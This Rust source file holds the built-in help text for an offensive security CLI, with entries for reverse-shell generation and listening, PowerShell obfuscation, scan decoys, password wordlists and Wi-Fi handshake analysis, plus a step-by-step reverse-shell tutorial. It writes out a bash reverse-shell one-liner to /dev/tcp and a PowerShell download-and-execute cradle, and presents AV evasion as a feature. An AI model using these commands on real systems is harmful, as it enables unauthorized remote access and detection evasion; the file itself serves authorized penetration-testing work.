//! In-app plain-language guide for every command, tool, feature, and
//! function this agent exposes.
//!
//! The goal is *operational clarity*: an operator (or a new teammate)
//! should be able to read what a command **does**, what it **achieves**,
//! exactly **how to run it**, and **when to use it** — without needing the
//! source code, the README, or a wiki. Every entry is a single static
//! record so the guide is always in sync with the binary and can be
//! rendered from the CLI (`--guide`, `--tool-help`) and the TUI.
//!
//! # Design
//!
//! - **No external crates.** Plain `&'static str` records only.
//! - **Deterministic.** The guide is compiled into the binary; there is no
//!   runtime discovery, so output is identical on every machine.
//! - **Authorized-tool-first.** Every entry that opens a socket or runs a
//!   live-network action explicitly states the `--allow-network` opt-in.

use std::fmt::Write as _;

/// Help for one command: what it is, what it achieves, how to run it.
#[derive(Debug, Clone, Copy)]
pub struct CommandHelp {
    /// The CLI flag or command name, e.g. `"--listen"`.
    pub command: &'static str,
    /// One-line plain-language summary of what the command *is*.
    pub summary: &'static str,
    /// What using the command achieves (the outcome), plain language.
    pub outcome: &'static str,
    /// Exact usage syntax.
    pub usage: &'static str,
    /// Concrete example invocations (at least one).
    pub examples: &'static [&'static str],
    /// When an operator should reach for this command.
    pub when_to_use: &'static str,
    /// Whether this command opens a socket or performs live network I/O.
    /// Such commands require the per-invocation `--allow-network` opt-in.
    pub network_action: bool,
}

impl CommandHelp {
    /// Render this command's help entry as a human-readable block.
    #[must_use]
    pub fn render(&self) -> String {
        let mut out = String::new();
        let _ = writeln!(out, "{}\n{}", self.command, "=".repeat(self.command.len()));
        let _ = writeln!(out, "WHAT IT IS:  {}", self.summary);
        let _ = writeln!(out, "WHAT IT DOES FOR YOU:  {}", self.outcome);
        let _ = writeln!(out, "USAGE:  {}", self.usage);
        out.push_str("EXAMPLES:\n");
        for example in self.examples {
            let _ = writeln!(out, "  {example}");
        }
        let _ = writeln!(out, "WHEN TO USE:  {}", self.when_to_use);
        if self.network_action {
            out.push_str(
                "NETWORK:  This command performs live network activity; it runs only when the \
                 explicit `--allow-network` flag is given.\n",
            );
        }
        out.push('\n');
        out
    }
}

/// The complete guide: every command, tool, and capability the binary
/// exposes, in plain language. Kept alphabetical by command name so the
/// output is stable and diffable across releases.
pub static ALL_COMMANDS: &[CommandHelp] = &[
    CommandHelp {
        command: "--about",
        summary: "Shows the agent's identity: version, mission, and roadmap.",
        outcome: "Confirms which build you are running and what the project is for.",
        usage: "--about",
        examples: &["security-agent --about", "security-agent --version"],
        when_to_use: "First command to run on any new machine to confirm the binary is real.",
        network_action: false,
    },
    CommandHelp {
        command: "--analyze-handshake",
        summary: "Analyzes captured WPA/WPA2 EAPOL frames for handshake completeness.",
        outcome: "Tells you whether you captured all four frames needed to attempt a Wi-Fi password audit.",
        usage: "--analyze-handshake <eapol-hex-frame1> [frame2] ...",
        examples: &[
            "security-agent --analyze-handshake 02010000... 02020000...",
            "security-agent --analyze-handshake 01030000abcd 02010000efgh",
        ],
        when_to_use: "After capturing Wi-Fi packets, to check if you have a complete handshake for cracking.",
        network_action: false,
    },
    CommandHelp {
        command: "--analyze-keys",
        summary: "Analyzes an authorized_keys file for lateral-movement risk.",
        outcome: "Finds keys, comments, and risks that could let an attacker move between machines.",
        usage: "--analyze-keys <path-or-content>",
        examples: &["security-agent --analyze-keys /home/user/.ssh/authorized_keys"],
        when_to_use: "During a post-exploitation review to spot dangerous SSH trust relationships.",
        network_action: false,
    },
    CommandHelp {
        command: "--analyze-passwd",
        summary: "Analyzes a /etc/passwd file for privilege-escalation indicators.",
        outcome: "Flags accounts with shells, UID 0 entries, and other privesc attack surface.",
        usage: "--analyze-passwd <path-or-content>",
        examples: &["security-agent --analyze-passwd /etc/passwd"],
        when_to_use: "During Linux post-exploitation to find accounts worth targeting.",
        network_action: false,
    },
    CommandHelp {
        command: "--analyze-payload",
        summary: "Scores a payload for shellcode-like characteristics and detection risk.",
        outcome: "Gives length, entropy, printable ratio, and a shellcode score with AV-evasion suggestions.",
        usage: "--analyze-payload <payload>",
        examples: &["security-agent --analyze-payload 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"],
        when_to_use: "Before delivering a payload, to understand how detectable it is.",
        network_action: false,
    },
    CommandHelp {
        command: "--analyze-sudoers",
        summary: "Analyzes a sudoers file for dangerous privilege-escalation rules.",
        outcome: "Flags NOPASSWD entries, writable paths, and commands that let users become root.",
        usage: "--analyze-sudoers <path-or-content>",
        examples: &["security-agent --analyze-sudoers /etc/sudoers"],
        when_to_use: "During Linux privilege-escalation enumeration.",
        network_action: false,
    },
    CommandHelp {
        command: "--ask",
        summary: "Routes a plain-English instruction to the right read-only capability.",
        outcome: "Lets you drive the agent conversationally; it explains (but never widens) any action that needs authorization.",
        usage: "--ask <plain-English instruction>",
        examples: &[
            "security-agent --ask \"what tools do you have\"",
            "security-agent --ask \"is this suspicious: admin\"",
            "security-agent --ask \"who are you\"",
        ],
        when_to_use: "When you prefer natural language over remembering flag names.",
        network_action: false,
    },
    CommandHelp {
        command: "--audit-wifi",
        summary: "Audits a wireless network's security posture from its configuration.",
        outcome: "Rates the network (open/WEP/WPA/WPA2/WPA3) and lists weaknesses and recommendations.",
        usage: "--audit-wifi <essid> <security-protocol> <encryption>",
        examples: &[
            "security-agent --audit-wifi MyNetwork wpa2 aes",
            "security-agent --audit-wifi GuestNet open none",
        ],
        when_to_use: "During wireless assessment to triage which networks are weakest.",
        network_action: false,
    },
    CommandHelp {
        command: "--gen-decoys",
        summary: "Generates decoy IP addresses to blend a scan's source.",
        outcome: "Produces a decoy list you can feed to tools like nmap (-D) to obscure your real source IP.",
        usage: "--gen-decoys <real-ip> [count]",
        examples: &["security-agent --gen-decoys 192.168.1.100 8"],
        when_to_use: "When you want scan source obfuscation during an authorized engagement.",
        network_action: false,
    },
    CommandHelp {
        command: "--gen-shell",
        summary: "Generates a reverse/bind shell payload for a target platform.",
        outcome: "Prints a ready-to-paste one-liner (and a base64-encoded copy) that connects back to your listener.",
        usage: "--gen-shell <type> <lhost> <lport> | --gen-shell --list",
        examples: &[
            "security-agent --gen-shell bash 10.0.0.5 4444",
            "security-agent --gen-shell python 10.0.0.5 4444",
            "security-agent --gen-shell powershell 10.0.0.5 4444",
            "security-agent --gen-shell --list",
        ],
        when_to_use: "With --listen on the attacker machine: generate a payload, run it on the target, catch the shell. `--list` shows every payload type.",
        network_action: false,
    },
    CommandHelp {
        command: "--gen-wordlist",
        summary: "Builds a targeted password wordlist from facts you know about a target.",
        outcome: "Produces a deduplicated list of likely passwords combining names, years, and common suffixes.",
        usage: "--gen-wordlist <target-name> [company] [year] [extra words...]",
        examples: &["security-agent --gen-wordlist acme-corp Acme 2026 admin backup"],
        when_to_use: "Before a credential attack, to feed a password cracker a focused wordlist.",
        network_action: false,
    },
    CommandHelp {
        command: "--guide",
        summary: "Prints the complete plain-language guide for every command and tool.",
        outcome: "One reference page explaining what each command does, what it achieves, and how to run it.",
        usage: "--guide [section]",
        examples: &[
            "security-agent --guide",
            "security-agent --guide reverse-shell",
            "security-agent --guide tools",
        ],
        when_to_use: "Any time you need to know what the agent can do and how to do it.",
        network_action: false,
    },
    CommandHelp {
        command: "--hash-id",
        summary: "Identifies the algorithm of a password hash.",
        outcome: "Tells you the hash type and the right John/Hashcat mode, so you crack it with the correct tool.",
        usage: "--hash-id <hash>",
        examples: &[
            "security-agent --hash-id 5d41402abc4b2a76b9719d911017c592",
            "security-agent --hash-id '$2a$10$N9qo8uLOickgx2ZMRZoMyeI'",
        ],
        when_to_use: "Before running hashcat or john, so you pick the right mode.",
        network_action: false,
    },
    CommandHelp {
        command: "--listen",
        summary: "Starts a TCP reverse-shell listener that catches inbound shell connections.",
        outcome: "Runs an interactive shell session with every target that connects back, with per-session byte and time stats; `--log` persists each session to a JSON Lines audit file.",
        usage: "--listen <port> [max-connections] [bind-address] [--log <path>]",
        examples: &[
            "security-agent --allow-network --listen 4444",
            "security-agent --allow-network --listen 4444 5",
            "security-agent --allow-network --listen 4444 5 192.168.1.100",
            "security-agent --allow-network --listen 4444 --log sessions.jsonl",
        ],
        when_to_use: "On your attack machine, paired with --gen-shell: catch the shell from the target. `--log` keeps a structured session audit trail.",
        network_action: true,
    },
    CommandHelp {
        command: "--list-skills",
        summary: "Lists the skills compiled into the binary.",
        outcome: "Shows one general skill plus one skill per cataloged tool so you know what the agent can walk you through.",
        usage: "--list-skills",
        examples: &["security-agent --list-skills"],
        when_to_use: "To discover training/instruction assets bundled with the agent.",
        network_action: false,
    },
    CommandHelp {
        command: "--list-tools",
        summary: "Lists cataloged tools and their install/integrity status.",
        outcome: "Distinguishes built-in substitutes, installed executables, and missing tools, with integrity state.",
        usage: "--list-tools",
        examples: &["security-agent --list-tools"],
        when_to_use: "Before a scan, to see which real tools are available on this machine.",
        network_action: false,
    },
    CommandHelp {
        command: "--llm-generate",
        summary: "Continues a prompt with the built-in neural language model.",
        outcome: "Produces advisory text from a small, fully-offline model — no network and no cloud API.",
        usage: "--llm-generate <prompt words...>",
        examples: &["security-agent --llm-generate the attacker likely"],
        when_to_use: "For local, offline text generation experiments and demonstrations.",
        network_action: false,
    },
    CommandHelp {
        command: "--llm-perplexity",
        summary: "Scores how in-domain a text reads to the built-in model.",
        outcome: "Lower perplexity means the text looks normal for the security domain; higher flags odd/out-of-domain content.",
        usage: "--llm-perplexity <text words...>",
        examples: &["security-agent --llm-perplexity buffer overflow in parser"],
        when_to_use: "As an advisory lens on finding text before you trust it.",
        network_action: false,
    },
    CommandHelp {
        command: "--obfuscate-ps",
        summary: "Applies PowerShell obfuscation techniques to a command.",
        outcome: "Returns several encoded/obfuscated variants that are harder for naive string matching to catch.",
        usage: "--obfuscate-ps <command>",
        examples: &[
            "security-agent --obfuscate-ps 'IEX(New-Object Net.WebClient).DownloadString(...)'",
        ],
        when_to_use: "During Windows red-team work to vary payload signatures.",
        network_action: false,
    },
    CommandHelp {
        command: "--offline-status",
        summary: "Reports the local runtime state: tools, skills, and health.",
        outcome: "Confirms the binary is working, what's installed, and whether capability coverage is OK.",
        usage: "--offline-status  (also the default when no arguments are given)",
        examples: &["security-agent --offline-status", "security-agent"],
        when_to_use: "First smoke test after building or deploying the agent.",
        network_action: false,
    },
    CommandHelp {
        command: "--password-strength",
        summary: "Scores a password's strength and crack resistance.",
        outcome: "Gives length, entropy bits, a rating, an estimated crack time, and weaknesses to fix.",
        usage: "--password-strength <password>",
        examples: &["security-agent --password-strength 'Tr0ub4dor&3'"],
        when_to_use: "To evaluate credential policy or choose better test passwords.",
        network_action: false,
    },
    CommandHelp {
        command: "--plan-scan",
        summary: "Plans an authorized engagement scan from a config file.",
        outcome: "Validates scope, techniques, approvals, and time window; prints the scan plan (and can execute it).",
        usage: "--plan-scan <config> [--execute <args>] [--audit-log <path>] [--findings-log <path>] [--cognitive-review] [--memory <log>]",
        examples: &[
            "security-agent --plan-scan engagement.conf",
            "security-agent --plan-scan engagement.conf --execute -sV",
            "security-agent --plan-scan engagement.conf --audit-log audit.jsonl --execute -sV",
        ],
        when_to_use: "To turn an authorized scope into a least-privilege, auditable scan plan.",
        network_action: true,
    },
    CommandHelp {
        command: "--record-findings",
        summary: "Merges findings from one log onto another.",
        outcome: "Appends findings without planning, authorizing, or executing anything — a pure bookkeeping merge.",
        usage: "--record-findings <destination-log> <source-log>",
        examples: &["security-agent --record-findings all.jsonl new-scan.jsonl"],
        when_to_use: "To consolidate findings logs across engagements.",
        network_action: false,
    },
    CommandHelp {
        command: "--report",
        summary: "Renders an engagement report from a findings log.",
        outcome: "Produces SARIF 2.1.0, JSON summary, or Markdown deliverables for clients or auditors.",
        usage: "--report <findings-log> [--format sarif|json|markdown] [--evidence <path>]",
        examples: &[
            "security-agent --report findings.jsonl",
            "security-agent --report findings.jsonl --format sarif",
            "security-agent --report findings.jsonl --format markdown",
        ],
        when_to_use: "At the end of an engagement to generate the official report.",
        network_action: false,
    },
    CommandHelp {
        command: "--run-external-tool",
        summary: "Runs a real, locally-installed cataloged security tool.",
        outcome: "Spawns the actual tool binary with your arguments, gated by network mode; live tools need --allow-network.",
        usage: "--run-external-tool [--allow-network] <name> <args...>",
        examples: &[
            "security-agent --run-external-tool semgrep --version",
            "security-agent --run-external-tool --allow-network nmap -sV 192.168.1.10",
            "security-agent --run-external-tool --allow-network masscan -p80 192.168.1.0/24",
        ],
        when_to_use: "When you need a real tool's full power and it is already installed.",
        network_action: true,
    },
    CommandHelp {
        command: "--run-tool",
        summary: "Runs a built-in offline substitute tool on a local file.",
        outcome: "Performs forensic/local analysis (autopsy, volatility, wireshark/pcap, binwalk, foremost, bulk_extractor, hashdeep) with no network.",
        usage: "--run-tool <name> <local-path> [--output <file>.txt]",
        examples: &[
            "security-agent --run-tool autopsy /path/to/disk.img",
            "security-agent --run-tool volatility /path/to/mem.dump",
            "security-agent --run-tool wireshark capture.pcap",
            "security-agent --run-tool hashdeep /path/to/dir --output report.txt",
        ],
        when_to_use: "For offline forensic analysis when the real tool isn't installed.",
        network_action: false,
    },
    CommandHelp {
        command: "--schedule-retest",
        summary: "Prints a retest schedule from a findings log.",
        outcome: "Orders findings by risk score so the most severe items get retested first.",
        usage: "--schedule-retest <findings-log-path>",
        examples: &["security-agent --schedule-retest findings.jsonl"],
        when_to_use: "After remediation, to plan the verification pass.",
        network_action: false,
    },
    CommandHelp {
        command: "--show-skill",
        summary: "Prints the named embedded skill (general or per-tool).",
        outcome: "Gives you the full step-by-step playbook for a tool or for the agent itself.",
        usage: "--show-skill <name>",
        examples: &[
            "security-agent --show-skill nmap",
            "security-agent --show-skill security-agent",
        ],
        when_to_use: "To read the detailed instructions for any bundled skill.",
        network_action: false,
    },
    CommandHelp {
        command: "--tool-help",
        summary: "Prints the plain-language guide for one specific command or tool.",
        outcome: "The focused version of --guide for a single command, with examples.",
        usage: "--tool-help <command-or-tool>",
        examples: &[
            "security-agent --tool-help --listen",
            "security-agent --tool-help --gen-shell",
        ],
        when_to_use: "When you only need instructions for one thing.",
        network_action: false,
    },
    CommandHelp {
        command: "--tui",
        summary: "Opens an interactive terminal menu over every command.",
        outcome: "Lets you drive the whole agent with numbered menus and a plain-English chat bar — identical behavior to the CLI.",
        usage: "--tui",
        examples: &["security-agent --tui"],
        when_to_use: "For an interactive, guided session on a terminal.",
        network_action: false,
    },
    CommandHelp {
        command: "--view-audit",
        summary: "Reads a persisted audit log (JSON Lines).",
        outcome: "Prints audit records under the least-privilege Viewer role — never plans or executes.",
        usage: "--view-audit <log-path>",
        examples: &["security-agent --view-audit audit.jsonl"],
        when_to_use: "To review what was authorized and executed.",
        network_action: false,
    },
    CommandHelp {
        command: "--view-audit-db",
        summary: "Reads a persisted audit database (.sadb).",
        outcome: "Prints audit records stored in the embedded append-only store.",
        usage: "--view-audit-db <db-path>",
        examples: &["security-agent --view-audit-db audit.sadb"],
        when_to_use: "When audits are persisted to the .sadb store.",
        network_action: false,
    },
    CommandHelp {
        command: "--view-calibration-db",
        summary: "Reads a persisted calibration database (.sadb).",
        outcome: "Prints confidence-calibration records collected across runs.",
        usage: "--view-calibration-db <db-path>",
        examples: &["security-agent --view-calibration-db calibration.sadb"],
        when_to_use: "To inspect how well the cognitive layer's confidence tracks reality.",
        network_action: false,
    },
    CommandHelp {
        command: "--view-findings-db",
        summary: "Reads a persisted findings database (.sadb).",
        outcome: "Prints findings stored in the embedded append-only store.",
        usage: "--view-findings-db <db-path>",
        examples: &["security-agent --view-findings-db findings.sadb"],
        when_to_use: "When findings are persisted to the .sadb store.",
        network_action: false,
    },
    CommandHelp {
        command: "--view-reasoning-log-db",
        summary: "Reads a persisted reasoning-log database (.sadb).",
        outcome: "Prints archived reasoning chains from --cognitive-review runs.",
        usage: "--view-reasoning-log-db <db-path>",
        examples: &["security-agent --view-reasoning-log-db reasoning.sadb"],
        when_to_use: "To review the agent's past reasoning for transparency.",
        network_action: false,
    },
    CommandHelp {
        command: "--wps-pin",
        summary: "Analyzes a WPS PIN for default or vulnerable status.",
        outcome: "Checks the PIN's checksum and common defaults so you know if it's worth attacking.",
        usage: "--wps-pin <pin>",
        examples: &["security-agent --wps-pin 12345670"],
        when_to_use: "During wireless assessment of WPS-enabled access points.",
        network_action: false,
    },
];

/// Sections of the guide that group related commands for `--guide <section>`.
pub static GUIDE_SECTIONS: &[(&str, &str, &[&str])] = &[
    (
        "getting-started",
        "First commands to run on a new machine: status, about, guide, list tools.",
        &[
            "--offline-status",
            "--about",
            "--guide",
            "--list-tools",
            "--list-skills",
        ],
    ),
    (
        "reverse-shell",
        "End-to-end remote shell workflow: generate a payload, start a listener, catch the shell.",
        &[
            "--listen",
            "--gen-shell",
            "--analyze-payload",
            "--obfuscate-ps",
            "--gen-decoys",
        ],
    ),
    (
        "offensive",
        "Offensive red-team tooling: payloads, credential analysis, Wi-Fi audit, obfuscation.",
        &[
            "--gen-shell",
            "--hash-id",
            "--password-strength",
            "--gen-wordlist",
            "--obfuscate-ps",
            "--gen-decoys",
            "--analyze-handshake",
            "--wps-pin",
            "--audit-wifi",
            "--listen",
        ],
    ),
    (
        "defensive",
        "Defensive hardening and analysis: passwd/sudoers/keys analysis, payload scoring, reports.",
        &[
            "--analyze-passwd",
            "--analyze-sudoers",
            "--analyze-keys",
            "--analyze-payload",
            "--report",
            "--schedule-retest",
        ],
    ),
    (
        "planning",
        "Authorized engagement planning and execution.",
        &[
            "--plan-scan",
            "--record-findings",
            "--view-audit",
            "--view-audit-db",
            "--view-findings-db",
        ],
    ),
    (
        "tools",
        "Running real or built-in analysis tools.",
        &[
            "--run-tool",
            "--run-external-tool",
            "--list-tools",
            "--show-skill",
        ],
    ),
    (
        "cognition",
        "Neural and cognitive features: LLM text, perplexity, plain-English routing.",
        &[
            "--llm-generate",
            "--llm-perplexity",
            "--ask",
            "--tui",
            "--lm-eval",
        ],
    ),
    (
        "databases",
        "Embedded append-only store views.",
        &[
            "--view-audit-db",
            "--view-findings-db",
            "--view-calibration-db",
            "--view-reasoning-log-db",
        ],
    ),
];

/// Render the complete plain-language guide for every command.
#[must_use]
pub fn render_all_help() -> String {
    let mut out = String::new();
    out.push_str("Security-Agent — Plain-Language Guide\n");
    out.push_str("=====================================\n");
    out.push_str("Each entry explains WHAT the command is, WHAT IT ACHIEVES,\n");
    out.push_str("HOW to run it, and WHEN to use it.\n\n");
    out.push_str("Commands marked NETWORK perform live network activity and\n");
    out.push_str("require the explicit `--allow-network` opt-in.\n\n");
    for help in ALL_COMMANDS {
        out.push_str(&help.render());
    }
    out
}

/// Render the guide for one named command or tool, or `None` if unknown.
#[must_use]
pub fn render_help_for(name: &str) -> Option<String> {
    let normalized = normalize_name(name);
    ALL_COMMANDS
        .iter()
        .find(|h| normalize_name(h.command) == normalized)
        .map(CommandHelp::render)
}

/// Render one named guide section (e.g. `"reverse-shell"`).
#[must_use]
pub fn render_section(section: &str) -> Option<String> {
    let normalized = section.trim().to_ascii_lowercase();
    GUIDE_SECTIONS
        .iter()
        .find(|(name, _, _)| *name == normalized)
        .map(|(title, blurb, commands)| {
            let mut out = String::new();
            let _ = writeln!(out, "Guide section: {title}");
            let _ = writeln!(out, "{}\n", "=".repeat(title.len() + 15));
            out.push_str(blurb);
            out.push_str("\n\n");
            for cmd in *commands {
                if let Some(help) = render_help_for(cmd) {
                    out.push_str(&help);
                }
            }
            out
        })
}

/// Render the end-to-end reverse shell tutorial.
#[must_use]
pub fn render_reverse_shell_guide() -> String {
    let mut out = String::new();
    out.push_str("Reverse Shell — Step-by-Step\n");
    out.push_str("============================\n\n");
    out.push_str("A reverse shell lets a target machine connect BACK to you,\n");
    out.push_str("giving you an interactive command prompt on that machine.\n");
    out.push_str("It is called 'reverse' because the target initiates the\n");
    out.push_str("connection to your listener, which is far more likely to\n");
    out.push_str("work than a 'bind' shell where you must reach the target.\n\n");

    out.push_str("WHAT YOU NEED\n");
    out.push_str("-------------   \n");
    out.push_str("  1. Your machine (attacker/operator) that can accept inbound TCP.\n");
    out.push_str("  2. The target machine where you can run a command.\n");
    out.push_str("  3. Written authorization to test the target (required for legal use).\n\n");

    out.push_str("STEP 1 — Start your listener\n");
    out.push_str("-----------------------------  \n");
    out.push_str("Run this on YOUR machine. It waits for the target to connect:\n\n");
    out.push_str("    security-agent --allow-network --listen 4444\n\n");
    out.push_str("  * 4444 is the port. Choose any unused port you can open.\n");
    out.push_str("  * --allow-network is required because the listener opens a socket.\n");
    out.push_str("  * Add a number to limit connections: --listen 4444 5\n");
    out.push_str(
        "  * Add an address to bind a specific interface: --listen 4444 5 192.168.1.100\n",
    );
    out.push_str("  * Add --log <path> to persist every session to a JSON Lines audit file:\n");
    out.push_str("      --listen 4444 --log sessions.jsonl\n\n");

    out.push_str("STEP 2 — Generate a payload for the target\n");
    out.push_str("------------------------------------------\n");
    out.push_str("On your machine (or anywhere), generate a one-liner that fits\n");
    out.push_str("the target's operating system:\n\n");
    out.push_str("    security-agent --gen-shell bash 10.0.0.5 4444\n");
    out.push_str("    security-agent --gen-shell python 10.0.0.5 4444\n");
    out.push_str("    security-agent --gen-shell powershell 10.0.0.5 4444\n\n");
    out.push_str("  * Replace 10.0.0.5 with YOUR machine's IP address.\n");
    out.push_str("  * Replace 4444 with the same port as your listener.\n");
    out.push_str("  * `--gen-shell --list` prints every payload type available.\n\n");

    out.push_str("STEP 3 — Deliver and run the payload on the target\n");
    out.push_str("--------------------------------------------------\n");
    out.push_str("Copy the printed one-liner and execute it on the target:\n\n");
    out.push_str("  Linux target:   bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n");
    out.push_str("  Windows target: (PowerShell one-liner from --gen-shell powershell)\n\n");
    out.push_str("The target connects back to your listener.\n\n");

    out.push_str("STEP 4 — Interact with the shell\n");
    out.push_str("--------------------------------\n");
    out.push_str("Back on your listener terminal:\n");
    out.push_str("  * Type commands as if you were at the target's prompt.\n");
    out.push_str("  * Press Ctrl-D, or type `exit`, to close the session.\n");
    out.push_str("  * The listener stays up and catches the next connection.\n\n");

    out.push_str("SAFETY NOTES\n");
    out.push_str("------------\n");
    out.push_str("  * Only use this on systems you own or have explicit permission to test.\n");
    out.push_str("  * The listener prints who connected, session duration, and bytes.\n");
    out.push_str("  * Keep the listener bound to a known interface when possible.\n");
    out.push_str("  * The payload is visible to the target's security tooling — see\n");
    out.push_str("    --analyze-payload and --obfuscate-ps for detection-awareness.\n");
    out
}

/// Normalize a command name for lookup: strip leading dashes, lowercase.
fn normalize_name(name: &str) -> String {
    name.trim().trim_start_matches('-').to_ascii_lowercase()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_command_has_all_fields() {
        for help in ALL_COMMANDS {
            assert!(!help.command.is_empty(), "command name empty");
            assert!(
                !help.summary.is_empty(),
                "summary empty for {}",
                help.command
            );
            assert!(
                !help.outcome.is_empty(),
                "outcome empty for {}",
                help.command
            );
            assert!(!help.usage.is_empty(), "usage empty for {}", help.command);
            assert!(
                !help.examples.is_empty(),
                "examples empty for {}",
                help.command
            );
            assert!(
                !help.when_to_use.is_empty(),
                "when_to_use empty for {}",
                help.command
            );
        }
    }

    #[test]
    fn command_names_are_unique() {
        let mut names: Vec<String> = ALL_COMMANDS
            .iter()
            .map(|h| normalize_name(h.command))
            .collect();
        names.sort();
        let original_len = names.len();
        names.dedup();
        assert_eq!(names.len(), original_len, "duplicate command names");
    }

    #[test]
    fn guide_renders_all_commands() {
        let guide = render_all_help();
        assert!(guide.contains("--listen"));
        assert!(guide.contains("--gen-shell"));
        assert!(guide.contains("Plain-Language Guide"));
    }

    #[test]
    fn help_for_known_command_renders() {
        let help = render_help_for("--listen").expect("--listen must be documented");
        assert!(help.contains("WHAT IT IS"));
        assert!(help.contains("USAGE"));
        assert!(help.contains("EXAMPLES"));
        assert!(help.contains("WHEN TO USE"));
        // Listen opens a socket, so it must be flagged as a network action.
        let listen = ALL_COMMANDS
            .iter()
            .find(|h| h.command == "--listen")
            .unwrap();
        assert!(listen.network_action);
    }

    #[test]
    fn help_for_unknown_command_returns_none() {
        assert!(render_help_for("--definitely-not-a-command").is_none());
    }

    #[test]
    fn section_lookup_works() {
        let section = render_section("reverse-shell").expect("reverse-shell section");
        assert!(section.contains("reverse-shell"));
        assert!(section.contains("--listen"));
        assert!(render_section("nope-not-a-section").is_none());
    }

    #[test]
    fn reverse_shell_guide_is_complete() {
        let guide = render_reverse_shell_guide();
        assert!(guide.contains("STEP 1"));
        assert!(guide.contains("STEP 2"));
        assert!(guide.contains("STEP 3"));
        assert!(guide.contains("STEP 4"));
        assert!(guide.contains("--listen"));
        assert!(guide.contains("--gen-shell"));
    }

    #[test]
    fn normalize_name_handles_dashes() {
        assert_eq!(normalize_name("--listen"), "listen");
        assert_eq!(normalize_name("-listen"), "listen");
        assert_eq!(normalize_name("  --GEN-SHELL "), "gen-shell");
    }
}
